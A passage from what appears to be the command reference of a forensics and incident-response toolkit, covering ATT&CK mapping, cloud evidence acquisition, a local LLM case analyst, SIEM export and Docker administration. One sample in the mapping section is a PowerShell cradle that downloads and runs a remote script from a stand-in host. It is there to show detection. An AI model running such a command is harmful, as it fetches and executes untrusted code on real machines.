jq -c 'select(.techniques | length > 0)' <case>/<host>/artefacts/cooked/startup_items.jsonl
```

Taken from the October 2026 test runs:

```
<output>/<case>/
├── rowanholt_audit.log            # CSV: timestamp (UTC), image, stage, entry
├── mitre_techniques.txt           # ATT&CK techniques identified
├── <case>_navigator.json          # ATT&CK Navigator layer (if -N)
├── .memory_profiles.json          # memory jobs only
├── <disk image>/
│   ├── artefacts/
│   │   ├── raw/                   # collected files, as found on the image
│   │   ├── cooked/                # parsed artefacts
│   │   │   ├── registry/  evt/  browsers/  jumplists/
│   │   │   ├── journal_mft.jsonl  shimcache.jsonl  usb.log.jsonl  wbem.jsonl
│   │   └── plaso_timeline.jsonl   # if -T
│   ├── analysis/                  # written only when there are results
│   │   ├── analysis.jsonl         # if -A
│   │   ├── iocs.jsonl             # if -I
│   │   ├── keyword_matches.jsonl  # if -K
│   │   └── yara.jsonl             # if -Y
│   └── carved/                    # if carving; one folder per file type plus foremost's audit.txt
├── stacking.jsonl                 # -A on two or more hosts
└── <memory image>/
    └── memory_windows.<plugin>.<Plugin>.jsonl   # one table per Volatility 3 plugin
```

Shadow copies (`--vss`) get their own `<image> (volume shadow copy #N)` entries in the audit log.

---

## MITRE ATT&CK Tools

### Framework and Mapping (`mitre.cli`)

```bash
python3 -m src.analysis.mitre.cli [-v] COMMAND ...
```

| Command | Arguments | Does |
|---|---|---|
| `update` | `[-d enterprise\|mobile\|ics] [-f]` | Download ATT&CK data; `-f` ignores a fresh cache |
| `map` | `ARTIFACT_TYPE [-c CONTEXT] [-d JSON] [-o FILE]` | Map one artefact to techniques |
| `list-artifacts` | `[--detailed]` | List artefact types the mapper knows |
| `info` | `TECHNIQUE_ID [-d DOMAIN] [-o FILE]` | Show a technique |
| `stats` | `[-d DOMAIN] [--detailed]` | Framework statistics |
| `dashboard` | `-i MAPPINGS.json [-o DIR] [-f splunk,elastic,navigator]` | Build dashboards from a mappings file (default output `/tmp/rowanholt/dashboards`) |

```bash
python3 -m src.analysis.mitre.cli update
python3 -m src.analysis.mitre.cli map powershell_history -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
python3 -m src.analysis.mitre.cli info T1059.001
```

---

### Coverage Analysis (`mitre.coverage_cli`)

Every command takes `CASE_ID OUTPUT_DIR`.

| Command | Extra arguments | Does |
|---|---|---|
| `init` | — | Start coverage tracking for a case |
| `analyze` | `ARTIFACT_TYPE ARTIFACT_PATH [-c CONTEXT] [-d JSON]` | Add one artefact |
| `batch` | `ARTIFACT_LIST` (CSV: `type,path,context`) | Add many artefacts |
| `report` | `[--detailed]` | Coverage report |
| `stats` | `[--detailed]` | Coverage statistics |
| `dashboard` | `[-o FILE.html]` | Standalone HTML dashboard |
| `export` | `[-f json,csv,html,splunk,elastic] [-o PATH]` | Export coverage data |

```bash
python3 -m src.analysis.mitre.coverage_cli init CASE-001 /output/CASE-001
python3 -m src.analysis.mitre.coverage_cli dashboard CASE-001 /output/CASE-001 -o coverage.html
```

The ATT&CK Navigator layer for a case comes from Elrond (`--Navigator`) or the API (`GET /api/jobs/{job_id}/navigator`), not from these tools.

---

## Cloud Forensics

```bash
python3 -m src.analysis.rowanholt.cloud.cli {aws|azure|gcp|k8s} COMMAND [OPTIONS]
```

| Command | Options | Does |
|---|---|---|
| `list` | `[-c CREDS] [--region R] [--resource-group G] [--zone Z] [-o FILE]` | List instances |
| `acquire-disk` | `-i INSTANCE [-c CREDS] [--region R] [--resource-group G] [--zone Z] [-o DIR] [--wait]` | Snapshot an instance's disks |
| `acquire-logs` | `[-c CREDS] [--days N \| --start-time ISO --end-time ISO] [-o DIR] [--analyze]` | Pull CloudTrail, Azure Activity or GCP Cloud Logging |
| `analyze-logs` | `-f LOG_FILE [-c CREDS] [-o DIR]` | Analyse acquired logs |

`--region` applies to AWS (and Azure location), `--resource-group` to Azure, `--zone` to GCP.

`k8s` takes only `analyze-logs`, with no credentials: an API server audit log exported from EKS, AKS, GKE or a self-managed cluster (JSON lines, a JSON array or an `EventList`), written as `k8s_audit.jsonl` and `k8s_audit_analysis.json` with the same flags and techniques as a node's collected audit log.

```bash
python3 -m src.analysis.rowanholt.cloud.cli aws list -c aws_creds.json --region eu-west-2
python3 -m src.analysis.rowanholt.cloud.cli aws acquire-disk -i i-1234567890abcdef0 -o ./snapshots/AWS-001 --wait
python3 -m src.analysis.rowanholt.cloud.cli azure acquire-logs --days 30 -o ./logs/AZURE-001 --analyze
python3 -m src.analysis.rowanholt.cloud.cli gcp acquire-disk -i myinstance --zone europe-west2-a -o ./snapshots/GCP-001
python3 -m src.analysis.rowanholt.cloud.cli k8s analyze-logs -f eks-audit.json -o ./logs/K8S-001
```

---

## Eru (AI Analyst)

In the web app this is **Ask Eru**; without Ollama it falls back to fixed questions answered from the case files ([ERU.md](ERU.md)). From the command line, Eru indexes case output into a vector store and answers questions over it with a local LLM (Ollama by default, or llama.cpp).

```bash
python3 -m src.analysis.rowanholt.ai.cli COMMAND ...
```

| Command | Arguments | Does |
|---|---|---|
| `index` | `CASE_ID OUTPUT_DIR [--timeline CSV] [--iocs CSV] [--processes CSV] [--network CSV] [--registry CSV] [--files CSV] [--cloud-logs JSON --cloud-provider P]` | Index a case |
| `query` | `CASE_ID "QUESTION" [--temperature T] [--max-tokens N] [--no-sources] [-o FILE] [-v]` | Ask a question |
| `suggest` | `CASE_ID [-o FILE]` | Suggest investigation paths |
| `summary` | `CASE_ID [--format text\|json\|markdown] [-o FILE]` | Case summary |
| `search` | `CASE_ID "QUERY" [--top-k N]` | Similarity search without the LLM |
| `info` | `CASE_ID` | Show what is indexed |

All commands accept `--llm-type ollama|llamacpp`, `--model-name` (default `llama3`) and, except `index`, `--base-dir` and `--model-path` (llama.cpp). `index` also takes `--device cpu|cuda` for embeddings. Indexes are read from `--base-dir`, default `$ROWANHOLT_DATA_DIR` or `/opt/rowanholt/data`.

```bash
python3 -m src.analysis.rowanholt.ai.cli index CASE-001 /output/CASE-001
python3 -m src.analysis.rowanholt.ai.cli query CASE-001 "What PowerShell commands were executed?"
python3 -m src.analysis.rowanholt.ai.cli summary CASE-001 --format markdown -o summary.md
```

### Web Interface

```bash
python3 -m src.analysis.rowanholt.ai.web_interface
```

It serves the chat UI at `http://localhost:5687/ai/chat/<case>` and JSON endpoints under `/ai/cases/`. Port 5687 is fixed (no option) and is also the frontend container's host port, so stop the frontend first or call `start_server(port=…)` from Python. Settings come from `ROWANHOLT_DATA_DIR`, `ROWANHOLT_LLM_TYPE` and `ROWANHOLT_MODEL_NAME`.

---

## SIEM Integration

There is no standalone SIEM exporter. Splunk and Elastic indexing runs inside Elrond:

```bash
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis --Splunk --Elastic --Navigator
```

or for a completed web job with `POST /api/jobs/{job_id}/export-siem`. Start the services first with `docker compose --profile siem up -d`; Elrond fails fast if a requested SIEM is unreachable.

| Variable | Used for |
|---|---|
| `SPLUNK_HOST`, `SPLUNK_PORT`, `SPLUNK_USERNAME`, `SPLUNK_PASSWORD` | Splunk management API (default port 8089) |
| `ELASTICSEARCH_HOST`, `ELASTICSEARCH_PORT`, `ELASTIC_USERNAME`, `ELASTIC_PASSWORD` | Elasticsearch |
| `KIBANA_HOST`, `KIBANA_PORT` | Kibana dashboards |

In Docker the worker gets `SPLUNK_HOST`, `SPLUNK_PASSWORD` and `ELASTICSEARCH_HOST` from `docker-compose.yml`. Splunk ingests through file monitors on a fixed `/tmp` path, so case output written elsewhere (an external drive, for example) is indexed in Elastic but not Splunk (known issue).

---

## Docker Administration (Anduril)

`rowanholt anduril` manages Rowanholt's own containers and images on Docker Desktop or OrbStack. It finds the engine running Rowanholt, even when another Docker context is active. It only lists or touches containers labelled with the `rowanholt` compose project and named `rowanholt-*`, plus the images they use. Nothing else on the engine is visible to it. `rowanholt aragorn` still works as an alias, from before Anduril had its own name.

```bash
rowanholt anduril status                    # containers, state, health, image
rowanholt anduril images                    # Rowanholt images, size, built or pulled, users
rowanholt anduril logs celery-worker -n 200
rowanholt anduril stats backend
rowanholt anduril restart frontend
rowanholt anduril update redis              # pull the upstream image; recreate if newer
rowanholt anduril pull postgres:15-alpine
rowanholt anduril rebuild celery-worker     # docker compose build, then up -d --no-deps
rowanholt anduril rmi <image-id>            # unused Rowanholt images only, never forced
rowanholt anduril prune                     # dangling images built for Rowanholt
```

Containers can be named by service (`celery-worker`) or container name (`rowanholt-celery-worker`). Destructive commands ask first; `-y` answers yes. Stopping, restarting, updating or rebuilding `celery-worker`, `postgres` or `redis` while an analysis job is running is refused unless you pass `--force`, and that confirmation is never answered by `-y`. If Docker isn't running, or your user can't reach its socket, Anduril says so and offers to start Docker Desktop or OrbStack, or to add you to the `docker` group on Linux.

The web UI's **Aragorn → Settings** tab (admins only) needs the Anduril service, which is the only container that holds the Docker socket:

```bash
rowanholt anduril enable    # explains what it grants, asks, then starts the anduril service
rowanholt anduril disable   # stops it and removes its socket access
```

`enable` reuses the compose files Rowanholt was started with (read from the containers' labels), so overrides stay applied. If the backend still uses the default `SECRET_KEY`, `enable` warns you, and the web page stays disabled until it's set, since anyone could otherwise forge an admin login. The HTTP API is in [API.md](API.md#docker-administration-anduril).

---

## Utility Commands

### Dependencies and Installation

`src/analysis/cli.py` (the `rowanholt-analyze` entry point in `pyproject.toml`) is meant to provide `--check-dependencies`, `--install` and `--version`, but it imports the old `elrond.*` package and fails with `ModuleNotFoundError: No module named 'elrond'`. Until that is fixed, use the Docker worker image, which has every tool installed, or [CONFIG.md](CONFIG.md) for manual installation.

### Database

The web backend's Postgres schema is managed with Alembic (`src/web/backend/alembic/`):

```bash
docker exec rowanholt-backend alembic upgrade head
```

### Logs

Each case writes `rowanholt_audit.log` (CSV, UTC timestamps) to its output directory. In Docker:

```bash
docker logs rowanholt-celery-worker --tail 100   # Elrond and task output
docker logs rowanholt-backend --tail 100          # API
```

---

## Configuration

Elrond is configured by its command-line options; there is no config file. The Docker stack is configured in `docker-compose.yml` and the variables in the SIEM and AI sections above. See [CONFIG.md](CONFIG.md) for tool installation and paths.

---

## Common Workflows

### Acquire and Analyse a Live Host

```bash
cd src/acquisition && sudo python3 python/gandalf.py None Local -M -O /evidence/CASE-001/acquisitions && cd -
python3 src/analysis/elrond.py CASE-001 /evidence/CASE-001/acquisitions/ /output/CASE-001 --Gandalf --Process --Analysis --Memory
python3 -m src.analysis.rowanholt.ai.cli index CASE-001 /output/CASE-001
python3 -m src.analysis.rowanholt.ai.cli query CASE-001 "What was the initial access vector?"
```

### Triage a Disk Image

```bash
python3 src/analysis/elrond.py TRIAGE-001 /evidence/TRIAGE-001 /output/TRIAGE-001 --Collect --Process --Analysis
```

Add `--extractIocs` only if you can wait: it added 43 minutes on a 12 GB Windows E01 and 71 on a 21 GB Linux image ([PERFORMANCE.md](PERFORMANCE.md)).

### Cloud Logs

```bash
python3 -m src.analysis.rowanholt.cloud.cli aws acquire-logs --days 7 -o ./logs/AWS-001 --analyze
python3 -m src.analysis.rowanholt.ai.cli index AWS-001 ./logs/AWS-001 --cloud-logs ./logs/AWS-001/cloudtrail.json --cloud-provider aws
```

### Several Images

Elrond processes every image it finds in `SOURCE_DIR` as one case. For separate cases, give each image its own directory and run them one after another, not in parallel: concurrent runs share `/mnt/elrond_mountNN` and unmount each other's images.

```bash
for dir in /evidence/*/; do
  case_id=$(basename "$dir")
  python3 src/analysis/elrond.py "$case_id" "$dir" "/output/$case_id" --Collect --Process --Analysis
done
```

---

## Troubleshooting

**`unrecognized arguments` from a `-m` module.** You ran it from inside `src/analysis`. Run it from the repository root (see the top of this page).

**A Linux image finishes in seconds with no output.** Loop devices leaked from an earlier run. Check `losetup -a` and release them with `kpartx -d` and `losetup -d` when nothing else is mounted.

**A job seems stalled.** Several steps log nothing for 30 minutes or more: foremost, Plaso, end-of-collection clean-up and the result statistics. Check the processes before cancelling; see [TEST_RUNNER_GUIDE.md](../tests/docs/TEST_RUNNER_GUIDE.md#long-silent-stretches).

**Mount permission errors.** Image mounting needs root or the privileged worker container.

**AI agent cannot reach the model.** Check Ollama with `ollama list`, then start it with `ollama serve`.

---

## Getting Help

```bash
python3 src/analysis/elrond.py --help
python3 src/acquisition/python/gandalf.py --help
python3 -m src.analysis.rowanholt.ai.cli --help
python3 -m src.analysis.rowanholt.cloud.cli --help
python3 -m src.analysis.mitre.cli --help
```

- [API Reference](API.md)
- [Usage Guide](USAGE.md)
- [Quick Start](QUICKSTART.md)
- [Security](SECURITY.md)
- GitHub Issues: https://github.com/cmdaltr/rowanholt/issues

---

**Version:** 2.1.0
**Last Updated:** 2026-10-22
**License:** See LICENSE file
